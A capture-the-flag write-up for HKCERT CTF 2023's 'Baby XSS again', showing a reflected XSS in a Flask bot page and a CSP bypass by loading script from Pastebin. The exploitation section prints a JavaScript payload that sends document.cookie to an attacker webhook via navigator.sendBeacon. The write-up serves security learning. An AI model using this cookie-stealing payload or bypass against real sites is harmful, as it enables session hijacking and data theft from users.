# Baby XSS again

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 100 solves / 132 points
- Author: ozetta
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113182724.png)

Someone complained that XSS challenges are hard. We hear your opinion.

You can inject any external javascript from `https://pastebin.com` as you like using the `src` parameter in the query string. Good luck!

Web: [http://babyxss-k7ltgk.hkcert23.pwnable.hk:28232?src=https://pastebin.com/xNRmEBhV](http://babyxss-k7ltgk.hkcert23.pwnable.hk:28232?src=https://pastebin.com/xNRmEBhV)

Attachment: [babyxss-again_a576f2579a020c0d546f8fd2acb33318.zip](https://file.hkcert23.pwnable.hk/babyxss-again_a576f2579a020c0d546f8fd2acb33318.zip)

**Note:** There is a guide for this challenge [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c).

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113183004.png)

In here, we can send an URL to the bot.

There's not much we can do here...

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/web/Baby-XSS-again/babyxss-again_a576f2579a020c0d546f8fd2acb33318.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/web/Baby-XSS-again)-[2023.11.13|18:31:14(HKT)]
└> file babyxss-again_a576f2579a020c0d546f8fd2acb33318.zip 
babyxss-again_a576f2579a020c0d546f8fd2acb33318.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/web/Baby-XSS-again)-[2023.11.13|18:31:14(HKT)]
└> unzip babyxss-again_a576f2579a020c0d546f8fd2acb33318.zip  
Archive:  babyxss-again_a576f2579a020c0d546f8fd2acb33318.zip
   creating: bot/
  inflating: bot/Dockerfile          
  inflating: bot/server.py           
  inflating: docker-compose.yml      
```

In the `bot/server.py`, we can see that this web application is written in Python's Flask web application framework.

**In GET route `/`, we can see there's a reflected XSS vulnerability:** 
```python
[...]
@app.route("/", methods=["GET", "POST"])
def index():
  if request.method == "POST" and request.remote_addr != "127.0.0.1":
    [...]
  else:
    out = """<html>
  <head>
    <title>XSS Bot - %s</title>
    <meta http-equiv="Content-Security-Policy" content="script-src https://hcaptcha.com https://*.hcaptcha.com https://pastebin.com">
    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
  </head>
  <body>
    <h1>XSS Bot - %s</h1>
    <form method="POST">
      <table>
      <tr>
        <td>URL</td>
        <td>
          <input name="url" size="70" />
        </td>
      </tr>
      </table>
      <div class="h-captcha" data-sitekey="%s"></div>
      <input type="submit" />
    </form>
  </body>
</html>""" % (chal["title"],chal["title"],H_SITEKEY)
    if "babyxss" in request.host:
      out += """<script src="%s"></script>""" % request.args.get("src", "http://example.com/")
    return out
[...]
```

In the above template string, we can control the `src` GET parameter, and it doesn't get sanitized/encoded/filtered.

With that said, we can load whatever JavaScript from any origin, right?

**Oh, wait a minute. There's a CSP (Content Security Policy) in the `<meta>` tag!**
```
script-src https://hcaptcha.com https://*.hcaptcha.com https://pastebin.com
```

In this CSP, it has a `script-src` directive, which means **it specifies which sources are allowed for JavaScript**.

So, which sources that the CSP specified?

```
https://hcaptcha.com
https://*.hcaptcha.com
https://pastebin.com
```

As you can see, **all domain `hcaptcha.com` and its subdomains** are able to load JavaScript in this web application.

However, there's 1 more very interesting source: `https://pastebin.com`.

If you don't know what's Pastebin, it's basically allows users to host/store some texts in their platform.

**Ah ha! We can host our own evil JavaScript payload on Pastebin!**

But wait, what can we do with the payload?

**In POST route `/`, we can see what the bot does:**
```python
[...]
@app.route("/", methods=["GET", "POST"])
def index():
  if request.method == "POST" and request.remote_addr != "127.0.0.1":
    if "url" not in request.form or request.form.get("url") == "":
      return "Please enter a URL"
    [...hCaptcha_stuff...]
    try:
      [...hCaptcha_stuff...]
      return visit(request.form.get("url"))
    except Exception as e:
      return str(e)
    if '"success":true' not in fetch:
      return "hCaptcha is broken"
  else:
    out = """<html>
  [...]
```

**When we send a POST request to `/`, it'll trigger the web application to call function `visit()` with argument `url`:**
```python
[...]
chal = {
  "title": "Baby XSS again",
  "domain": os.getenv("HOSTNAME","localhost:3000"),
  "flag": os.getenv("FLAG", "fakeflag{}"),
  "sleep": 1,
}

def visit(url):
  chrome_options = webdriver.ChromeOptions()
  chrome_options.add_argument("--disable-gpu")
  chrome_options.add_argument("--headless")
  chrome_options.add_argument("--no-sandbox")
  driver = webdriver.Chrome(options=chrome_options)
  try:
    driver.get("http://"+chal["domain"]+"/robots.txt?url="+quote_plus(url))
    driver.add_cookie({"name": "flag", "value": chal["flag"]})
    driver.get("about:blank")
    driver.get(url)
    time.sleep(chal["sleep"])
    return "Your URL has been visited by the "+chal["title"]+" bot.";
  except Exception as e:
    print(url, flush=True)
    print(e, flush=True)
    return "The "+chal["title"]+" bot did not handle your URL properly."
  finally:
    driver.quit()
[...]
```

The `visit()` function will launch a headless (no GUI) Chrome browser, and then it'll:

1. Add a new cookie with key `flag`, and the flag value
2. Go to our POST parameter's `url` URL

That being said, **the flag is being stored in the `flag` cookie!**

## Exploitation

**Armed with above information, let's host a JavaScript payload on Pastebin!**

**The payload we're gonna use is:**
```javascript
const WEBHOOK_URL = "<your_webhook_URL>";
var cookies = document.cookie;
navigator.sendBeacon(WEBHOOK_URL, cookies);
```

This payload will send a POST request to our webhook URL with all the cookies.

**Now, go to [https://pastebin.com/](https://pastebin.com/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113190745.png)

**Then, copy and paste our payload to the new paste:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113190827.png)

> Note: I'm using [requestrepo](https://requestrepo.com/) as the webhook URL.

**Next, scroll down a little bit and click "Create New Paste":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113190932.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113191003.png)

Now, we can copy and paste our Pastebin URL to the bot.

But before we do that, it's important to test the payload before sending it.

**To do so, we can provide a GET parameter `src` in the challenge's web application:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113191232.png)

However, it should failed.

**To understand why, we need to open our development tools, and view the "Console" tab:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113191311.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113191320.png)

**As you can see, it has the following error:**
```
The resource from “https://pastebin.com/HCUemL4g” was blocked due to MIME type (“text/html”) mismatch (X-Content-Type-Options: nosniff).
```

Hmm... Looks like our Pastebin URL got blocked because the MIME type (`text/html`) mismatched.

This is because our modern browser checks the `Content-Type` header of the embedded file. In our case, it's `text/plain`, which will not be executed as JavaScript.

**To solve this problem, we can use the "download" version:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113192158.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113192326.png)

Now the Pastebin will use the `text/html` MIME type!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113192443.png)

And our webhook received a POST HTTP request!

**To get the flag, we'll need to send the URL to the bot: `http://babyxss-k7ltgk.hkcert23.pwnable.hk:28232/?src=<pastebin_URL>`**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231113192516.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231111143444.png)

- **Flag: `hkcert23{pastebin_0r_trashbin}`**

## Conclusion

What we've learned:

1. Exploiting reflected XSS & CSP bypass using Pastebin